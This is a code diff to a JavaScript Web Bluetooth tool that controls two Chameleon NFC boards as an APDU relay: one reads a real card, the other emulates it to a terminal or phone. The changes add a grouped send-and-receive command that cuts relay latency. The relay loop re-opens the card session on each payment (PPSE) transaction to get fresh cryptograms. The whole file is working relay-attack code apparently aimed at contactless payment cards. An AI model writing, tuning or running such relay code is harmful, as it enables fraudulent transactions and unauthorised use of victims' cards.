@@ -18,7 +18,7 @@
  */
 'use strict';
 
-const BUILD = '2026-09-07b adaptive+mtu244';   // shown in the log so you can confirm which version loaded
+const BUILD = '2026-09-07c grouping';   // shown in the log so you can confirm which version loaded
 
 // --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
 const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
@@ -43,6 +43,7 @@ const CMD = {
   HF14A_4_RELAY_STOP: 6008,
   HF14A_4_SET_LED: 6010,
   HF14A_4_CARD_PROBE: 6011,
+  HF14A_4_APDU_SEND_RECV: 6012,   // send response AND block for next APDU (grouped)
 };
 // status codes: HF_TAG_OK=0, HF_TAG_NO=1, STATUS_SUCCESS=104 (apdu_recv uses SUCCESS)
 const ST = { HF_TAG_OK: 0, HF_TAG_NO: 1, SUCCESS: 104 };
@@ -237,6 +238,10 @@ class ChameleonBLE {
   }
   apduRecv() { return this.sendCmd(CMD.HF14A_4_APDU_RECV, new Uint8Array(0), 2500); }
   apduSend(resp) { return this.sendCmd(CMD.HF14A_4_APDU_SEND, concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp)); }
+  // Grouped: deliver `resp` (may be empty = pure blocking recv) AND wait on-device
+  // for the phone's next APDU, returned in the same round-trip. Kills the poll gap.
+  // Timeout > the firmware's ~600ms on-device block.
+  apduSendRecv(resp) { return this.sendCmd(CMD.HF14A_4_APDU_SEND_RECV, concat(u8([(resp.length >> 8) & 0xff, resp.length & 0xff]), resp), 2000); }
   async relayStart() {
     const r = await this.sendCmd(CMD.HF14A_4_RELAY_START, new Uint8Array(0), 3500);
     if (r.status === ST.HF_TAG_OK && r.data.length) r.parsed = parseAntiColl(r.data);
@@ -380,7 +385,8 @@ async function startRelay() {
     log('relay loop running — tap the terminal/phone on board1.', 'ok');
 
     let lastStat = 0;
-    let tPrevDone = performance.now();   // for measuring the wait-gap between APDUs
+    let pending = null;                    // next APDU already fetched by a grouped send-recv
+    const EMPTY = new Uint8Array([0, 0]);  // resp_len 0 => pure blocking recv (send nothing)
     while (running) {
       // Mode B, withheld: don't emulate; re-arm the moment the card appears.
       if (gate && !armed) {
@@ -396,49 +402,62 @@ async function startRelay() {
         await sleep(pollDelay()); continue;
       }
 
-      let r;
-      try { r = await ghost.apduRecv(); } catch (_) { await sleep(pollDelay()); continue; }
-      if (r.status !== ST.SUCCESS) {
-        const now = Date.now();
-        if (now - lastStat > 1000) {
-          lastStat = now;
-          const present = await safeProbe(mole);
-          if (gate && !present) {
-            await disarmEmulation(); armed = false;
-            ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red'); setLedUI('mole', 'red');
-            log('board2 card removed -> emulation WITHHELD (phone sees nothing)', 'warn');
-          } else {
-            ghost.setLed(present ? 1 : 3).catch(() => {});
-            setLedUI('ghost', present ? 'green' : 'red'); setLedUI('mole', present ? 'green' : 'red');
+      // Get the APDU to process: one a prior grouped send-recv already fetched
+      // (no wait), else block ON-DEVICE for the next one (no polling round-trips).
+      let apdu;
+      const tWait0 = performance.now();
+      if (pending !== null) {
+        apdu = pending; pending = null;
+      } else {
+        let r0;
+        try { r0 = await ghost.apduSendRecv(EMPTY); } catch (_) { await sleep(pollDelay()); continue; }
+        if (r0.status !== ST.SUCCESS) {
+          // idle (no APDU within the on-device block): mirror LED / Mode B disarm
+          const now = Date.now();
+          if (now - lastStat > 1000) {
+            lastStat = now;
+            const present = await safeProbe(mole);
+            if (gate && !present) {
+              await disarmEmulation(); armed = false;
+              ghost.setLed(3).catch(() => {}); setLedUI('ghost', 'red'); setLedUI('mole', 'red');
+              log('board2 card removed -> emulation WITHHELD (phone sees nothing)', 'warn');
+            } else {
+              ghost.setLed(present ? 1 : 3).catch(() => {});
+              setLedUI('ghost', present ? 'green' : 'red'); setLedUI('mole', present ? 'green' : 'red');
+            }
           }
+          continue;   // the ~600ms block already paced us; no extra sleep
         }
-        await sleep(pollDelay()); continue;
+        apdu = r0.data;
       }
+      const wait = performance.now() - tWait0;   // ~0 if pre-fetched, else the block wait
+      lastApduAt = Date.now();
 
-      const apdu = r.data;
-      const gap = performance.now() - tPrevDone;   // wait since previous APDU finished
-      lastApduAt = Date.now();   // activity -> keep polling tight (adaptive window)
       if (startsWith(apdu, PPSE_HEAD)) {
         log('--- new transaction (tap) --- re-opening mole session', 'ok');
-        await cloneFromMole(slot);   // re-open the card session for a fresh cryptogram
+        await cloneFromMole(slot);   // fresh card session for a fresh cryptogram
         apduCount = 0;
       }
       setLedUI('ghost', 'blue'); setLedUI('mole', 'blue');
-      const tGot = performance.now();       // apduRecv already returned this APDU
+      const tGot = performance.now();
       let rr;
       try { rr = await mole.relayApdu(apdu); }
       catch (_) { rr = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
       const tRelay = performance.now();
       const resp = rr.status === ST.HF_TAG_OK ? rr.data : new Uint8Array(0);
-      await ghost.apduSend(resp);
+      // GROUPED: deliver the response AND fetch the next APDU in one round-trip.
+      // The on-device wait for the phone's next command replaces the poll gap.
+      let rg;
+      try { rg = await ghost.apduSendRecv(resp); }
+      catch (_) { rg = { status: ST.HF_TAG_NO, data: new Uint8Array(0) }; }
       const tSend = performance.now();
+      if (rg.status === ST.SUCCESS) pending = rg.data;   // next APDU in hand -> no gap next iter
       apduCount++;
       log(`#${apduCount}  ->card ${hex(apdu)}`);
       log(`     card-> ${hex(resp)}  (st=${rr.status})`, resp.length ? '' : 'warn');
-      // timing: gap = wait for this APDU (poll+BLE, what adaptive poll targets),
-      // relay = mole round-trip (BLE+card), send = apduSend BLE write-back
-      log(`     t: gap ${gap.toFixed(0)}ms · relay ${(tRelay - tGot).toFixed(0)}ms · send ${(tSend - tRelay).toFixed(0)}ms`);
-      tPrevDone = tSend;
+      // timing: wait = time to obtain this APDU (~0 if pre-fetched), relay = mole
+      // round-trip, sendrecv = deliver response + on-device wait for the next APDU
+      log(`     t: wait ${wait.toFixed(0)}ms · relay ${(tRelay - tGot).toFixed(0)}ms · sendrecv ${(tSend - tRelay).toFixed(0)}ms`);
       if (!resp.length) log('empty card response — terminal will likely abort this APDU', 'warn');
       setLedUI('ghost', 'green'); setLedUI('mole', 'green');
     }
